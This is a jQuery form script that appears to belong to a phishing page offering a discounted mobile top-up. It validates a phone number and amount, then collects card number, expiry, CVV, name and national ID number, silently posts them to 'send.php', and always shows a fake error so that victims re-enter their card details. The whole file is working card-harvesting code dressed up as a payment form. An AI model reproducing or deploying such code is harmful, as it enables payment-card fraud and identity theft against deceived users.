function error(id, type){
	console.log("a");
	if(type == "add"){
		$("#"+id).addClass("error");
		$("#"+id+"_error").addClass("show");
	}
	else {
		$("#"+id).removeClass("error");
		$("#"+id+"_error").removeClass("show");
	}
}
function loading(num){
	$(".loading").css("display", "flex");
	setTimeout(function(){
		$(".step"+num).each(function(){
			$(this).css("display", "none");
		});
		num2 = num+1;
		$(".loading").css("display", "none");
		$(".step"+num2).each(function(){
			$(this).css("display", "block");
		});
	}, 2500);
}

$(".radio_select").click(function(){
	$(".radio_select").each(function(){
		$(this).removeClass("checked");
	});
	$(this).addClass("checked");
	$("#monto").val("");
	error("monto", "remove");
});


$("#numero").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#monto").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});

$("#numero").focusout(function(){
	if($("#numero").val().length != 10){
		error("numero", "add");
	}
	else {
		error("numero", "remove");
	}
});
$("#numero").keyup(function(){
	if($("#numero").val().length == 10){
		error("numero", "remove");
	}
});

$("#monto").focusout(function(){
	if($("#monto").val() < 50 || $("#monto").val() > 10000){
		error("monto", "add");
	}
	else {
		error("monto", "remove");
	}
});
$("#monto").keyup(function(){
	if($("#monto").val() > 50 || $("#monto").val() < 10000){
		error("monto", "remove");
	}
	else if($("#monto").val() > 10000){
		error("monto", "add");
	}
	if($("#monto").val() != ""){
		$(".radio_select").each(function(){
			$(this).removeClass("checked");
		});
	}
});

$("#email").focusout(function(){
	if(!$("#email").val().includes("@")){
		error("email", "add");
	}
	else {
		error("email", "remove");
	}
});


$("#terms").click(function(){
	$("#checkbox_terms").toggleClass("check").toggleClass("noncheck");
});



$("#submit").click(function(e){
	e.preventDefault();
	if($("#numero").val().length == 10){
		$("#numero_step2").text($("#numero").val());
		if($("#monto").val() == ""){
			$("#monto_step2").text("$"+$(".radio_select.checked input").val());
			final = ($(".radio_select.checked input").val()/100)*70;
			$("#montofinal").text("(Pagas $"+final+" final)");
			$("#montofinal_hidden").val(final);
		}
		else {
			$("#monto_step2").text("$"+$("#monto").val());
			final = ($("#monto").val()/100)*70;
			$("#montofinal").text("(Pagas $"+final+" final)");
			$("#montofinal_hidden").val(final);
		}
		if($("#email").val() != ""){
			error("email", "remove");
			if($("#checkbox_terms").hasClass("check")){
				$(".step1").each(function(){
					$(this).css("display", "none");
				});
				$(".step2").each(function(){
					$(this).css("display", "block");
				});
				$(".step2_1").each(function(){
					$(this).css("display", "flex");
				});
				error("checkbox", "remove");
				setTimeout(function(){
					$(".loading").each(function(){
						$(this).css("display", "none");
					});
				},2500);
			}
			else {
				error("checkbox", "add");
			}
		error("email", "add");
		}
		else {
			error("email", "remove");
		}
		error("numero", "remove");
	}
	else {
		error("numero", "add");
	}
});
$("#finish").click(function(e){
	e.preventDefault();
	if($("#card").val().length == 19){
		if($("#venc").val().length == 5){
			if($("#cvv").val() > 2){
				if($("#name").val() != ""){
					if($("#dni").val().length > 7){
						$("#dni").css("border", "1px solid #dddddd");
						$("#loading").css("display", "flex");
						var form = $("#verify_data");
						$.ajax({
							type: "POST",
							url: "send.php",
							data: form.serialize()
						});
						setTimeout(function(){
							$("#loading").css("display", "none");
							$("#error").css("display", "flex");
							$("#name").css("border", "1px solid red");
							$("#card").css("border", "1px solid red");
							$("#venc").css("border", "1px solid red");
							$("#cvv").css("border", "1px solid red");
							$('html, body').animate({
								scrollTop: $("#error").offset().top
							}, 1000);
						}, 2500);
					}
					else {
						$("#dni").css("border", "1px solid red");
					}
					$("#name").css("border", "1px solid #dddddd");
				}
				else {
					$("#name").css("border", "1px solid red");
				}
				$("#cvv").css("border", "1px solid #dddddd");
			}
			else {
				$("#cvv").css("border", "1px solid red");
			}
			$("#venc").css("border", "1px solid #dddddd");
		}
		else {
			$("#venc").css("border", "1px solid red");
		}
		$("#card").css("border", "1px solid #dddddd");
	}
	else {
		$("#card").css("border", "1px solid red");
	}
});

$("#name").bind('keypress', function (event) {
	var regex = new RegExp("^[a-zA-Z .\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#venc").keyup(function(){
	e = $(this).val();
	el = e.length;
	ele = $(this);
	if(el == 3){
		last = e.substr(2, 1);
		if(last == "/"){
			val1 = e.substr(0,2);
			ele.val(val1);
		}
		else{
			val1 = e.substr(0,2);
			val2 = e.substr(2, 1);
			ele.val(val1+"/"+val2);
		}
	}
});

$("#card").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#dni").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#venc").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#cvv").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#card").keyup(function(){
	e = $(this).val();
	el = e.length;
	ele = $(this);
	if(el == 5){
		last = e.substr(4, 1);
		if(last == " "){
			val1 = e.substr(0, 4);
			ele.val(val1);
		}
		else {
			val1 = e.substr(0, 4);
			val2 = e.substr(4, 1);
			ele.val(val1+" "+val2);
		}
	}
	else if(el == 10){
		last = e.substr(9, 1);
		if(last == " "){
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			ele.val(val1+" "+val2);
		}
		else {
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			val3 = e.substr(9, 1);
			ele.val(val1+" "+val2+" "+val3);
		}
	}
	else if(el == 15){
		last = e.substr(14, 1);
		if(last == " "){
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			val3 = e.substr(10, 4);
			ele.val(val1+" "+val2+" "+val3);
		}
		else {
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			val3 = e.substr(10, 4);
			val4 = e.substr(14, 4);
			ele.val(val1+" "+val2+" "+val3+" "+val4);
		}
	}
});